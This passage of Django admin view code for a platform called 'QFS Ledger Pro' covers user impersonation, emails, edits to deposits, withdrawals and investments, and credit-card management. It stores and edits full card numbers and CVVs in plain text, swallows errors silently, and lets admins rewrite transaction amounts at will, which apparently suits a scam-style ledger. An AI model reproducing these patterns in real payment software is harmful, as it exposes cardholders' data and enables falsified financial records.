QFS Ledger Pro Team''',
                    settings.DEFAULT_FROM_EMAIL,
                    [user.email],
                    fail_silently=False,
                )
            except:
                pass
            
            messages.success(request, f'Password reset successfully for {user.username}')
        else:
            messages.error(request, 'Password cannot be empty')
    
    return redirect('admin_user_detail', user_id=user_id)


@user_passes_test(is_admin)
def admin_impersonate_user(request, user_id):
    """Login as a specific user (impersonation)"""
    user = get_object_or_404(User, id=user_id)
    
    # Store the admin user ID in session before impersonating
    request.session['impersonating_admin_id'] = request.user.id
    request.session['is_impersonating'] = True
    
    # Log the impersonation
    UserActivityLog.objects.create(
        user=user,
        action="Account accessed by admin (impersonation)",
        details=f"Admin: {request.user.username}"
    )
    
    # Login as the user
    login(request, user, backend='django.contrib.auth.backends.ModelBackend')
    
    messages.warning(request, f'You are now impersonating {user.username}. Click "Stop Impersonation" to return to admin.')
    return redirect('dashboard')


@user_passes_test(is_admin)
def admin_stop_impersonation(request):
    """Stop impersonating and return to admin account"""
    if request.session.get('is_impersonating'):
        admin_id = request.session.get('impersonating_admin_id')
        if admin_id:
            admin_user = User.objects.get(id=admin_id)
            login(request, admin_user, backend='django.contrib.auth.backends.ModelBackend')
            
            del request.session['impersonating_admin_id']
            del request.session['is_impersonating']
            
            messages.success(request, 'Impersonation ended. You are back to your admin account.')
            return redirect('admin_dashboard')
    
    return redirect('admin_dashboard')


# ==========================================
# SEND EMAIL TO USER
# ==========================================

@user_passes_test(is_admin)
def admin_send_email_to_user(request, user_id):
    """Send email to a specific user"""
    user = get_object_or_404(User, id=user_id)
    
    if request.method == 'POST':
        subject = request.POST.get('subject')
        message = request.POST.get('message')
        
        if subject and message:
            try:
                send_mail(
                    subject,
                    message,
                    settings.DEFAULT_FROM_EMAIL,
                    [user.email],
                    fail_silently=False,
                )
                
                # Create notification record
                AdminNotification.objects.create(
                    user=user,
                    title=subject,
                    message=message,
                    sent_by=request.user
                )
                
                UserActivityLog.objects.create(
                    user=user,
                    action="Email sent by admin",
                    details=f"Subject: {subject}"
                )
                
                messages.success(request, f'Email sent successfully to {user.email}')
            except Exception as e:
                messages.error(request, f'Error sending email: {str(e)}')
        else:
            messages.error(request, 'Subject and message are required')
    
    return redirect('admin_user_detail', user_id=user_id)


# ==========================================
# TRANSACTION MANAGEMENT
# ==========================================

@user_passes_test(is_admin)
def admin_edit_deposit(request, deposit_id):
    """Edit deposit details"""
    deposit = get_object_or_404(Deposit, id=deposit_id)
    
    if request.method == 'POST':
        amount = request.POST.get('amount')
        status = request.POST.get('status')
        
        if amount:
            deposit.amount_in_usd = Decimal(amount)
        if status:
            deposit.status = status
        
        deposit.save()
        
        UserActivityLog.objects.create(
            user=deposit.user,
            action="Deposit edited by admin",
            details=f"Deposit ID: {deposit_id}"
        )
        
        messages.success(request, 'Deposit updated successfully')
        return redirect('admin_deposits')
    
    context = {'deposit': deposit}
    return render(request, 'custom_admin/edit_deposit.html', context)


@user_passes_test(is_admin)
def admin_edit_withdrawal(request, withdrawal_id):
    """Edit withdrawal details"""
    withdrawal = get_object_or_404(Withdrawal, id=withdrawal_id)
    
    if request.method == 'POST':
        amount = request.POST.get('amount')
        status = request.POST.get('status')
        
        if amount:
            withdrawal.amount_in_usd = Decimal(amount)
        if status:
            withdrawal.status = status
        
        withdrawal.save()
        
        UserActivityLog.objects.create(
            user=withdrawal.user,
            action="Withdrawal edited by admin",
            details=f"Withdrawal ID: {withdrawal_id}"
        )
        
        messages.success(request, 'Withdrawal updated successfully')
        return redirect('admin_withdrawals')
    
    context = {'withdrawal': withdrawal}
    return render(request, 'custom_admin/edit_withdrawal.html', context)


@user_passes_test(is_admin)
def admin_edit_investment(request, investment_id):
    """Edit investment details"""
    investment = get_object_or_404(UserInvestment, id=investment_id)
    
    if request.method == 'POST':
        amount = request.POST.get('amount')
        status = request.POST.get('status')
        
        if amount:
            investment.amount_in_usd = Decimal(amount)
        if status:
            investment.status = status
        
        investment.save()
        
        UserActivityLog.objects.create(
            user=investment.user,
            action="Investment edited by admin",
            details=f"Investment ID: {investment_id}"
        )
        
        messages.success(request, 'Investment updated successfully')
        return redirect('admin_investments')
    
    context = {'investment': investment}
    return render(request, 'custom_admin/edit_investment.html', context)

# ==========================================
# CREDIT CARD ADMIN MANAGEMENT
# ==========================================

@user_passes_test(is_admin)
def admin_card_detail_view(request, request_id):
    """Detailed view and management for credit card"""
    card_request = get_object_or_404(CreditCardRequest, id=request_id)
    
    context = {
        'card_request': card_request,
    }
    return render(request, 'custom_admin/card_detail.html', context)


@user_passes_test(is_admin)
def admin_ban_card(request, request_id):
    """Ban a credit card"""
    if request.method == 'POST':
        card_request = get_object_or_404(CreditCardRequest, id=request_id)
        reason = request.POST.get('reason', 'Banned by administrator')
        
        card_request.is_banned = True
        card_request.ban_reason = reason
        card_request.status = 'banned'
        card_request.save()
        
        UserActivityLog.objects.create(
            user=card_request.user,
            action="Credit card banned by admin",
            details=f"Card: {card_request.card_number[-4:] if card_request.card_number else 'N/A'} - Reason: {reason}"
        )
        
        # Send email notification
        try:
            send_mail(
                'Credit Card Banned',
                f'''Hello {card_request.user.first_name},

Your credit card ending in {card_request.card_number[-4:] if card_request.card_number else 'N/A'} has been banned.

Reason: {reason}

Please contact support if you have any questions.

Best regards,
QFS Ledger Pro Team''',
                settings.DEFAULT_FROM_EMAIL,
                [card_request.user.email],
                fail_silently=True,
            )
        except:
            pass
        
        messages.success(request, f'Card banned successfully')
    
    return redirect('admin_credit_cards')


@user_passes_test(is_admin)
def admin_unban_card(request, request_id):
    """Unban a credit card"""
    if request.method == 'POST':
        card_request = get_object_or_404(CreditCardRequest, id=request_id)
        
        card_request.is_banned = False
        card_request.ban_reason = None
        card_request.status = 'active'
        card_request.save()
        
        UserActivityLog.objects.create(
            user=card_request.user,
            action="Credit card unbanned by admin",
            details=f"Card: {card_request.card_number[-4:] if card_request.card_number else 'N/A'}"
        )
        
        messages.success(request, f'Card unbanned successfully')
    
    return redirect('admin_credit_cards')


@user_passes_test(is_admin)
def admin_update_card_details(request, request_id):
    """Update card number, CVV, expiry date"""
    card_request = get_object_or_404(CreditCardRequest, id=request_id)
    
    if request.method == 'POST':
        card_number = request.POST.get('card_number')
        cvv = request.POST.get('cvv')
        expiry_date = request.POST.get('expiry_date')
        
        if card_number:
            card_request.card_number = card_number
        if cvv:
            card_request.cvv = cvv
        if expiry_date:
            card_request.expiry_date = expiry_date
        
        card_request.save()
        
        UserActivityLog.objects.create(
            user=card_request.user,
            action="Credit card details updated by admin",
            details=f"Card ID: {request_id}"
        )
        
        messages.success(request, 'Card details updated successfully')
        return redirect('admin_card_detail', request_id=request_id)
    
    context = {'card_request': card_request}
    return render(request, 'custom_admin/update_card_details.html', context)


@user_passes_test(is_admin)
def admin_regulate_card_limits(request, request_id):
    """Update card spending limits"""
    card_request = get_object_or_404(CreditCardRequest, id=request_id)
    
    if request.method == 'POST':
        daily_limit = request.POST.get('daily_limit')
        monthly_limit = request.POST.get('monthly_limit')
        
        if daily_limit:
            card_request.daily_limit = Decimal(daily_limit)
        if monthly_limit:
            card_request.monthly_limit = Decimal(monthly_limit)
        
        card_request.save()
        
        UserActivityLog.objects.create(
            user=card_request.user,
            action="Credit card limits updated by admin",
            details=f"Daily: ${daily_limit}, Monthly: ${monthly_limit}"
        )
        
        messages.success(request, 'Card limits updated successfully')
        return redirect('admin_card_detail', request_id=request_id)
    
    context = {'card_request': card_request}
    return render(request, 'custom_admin/regulate_card_limits.html', context)
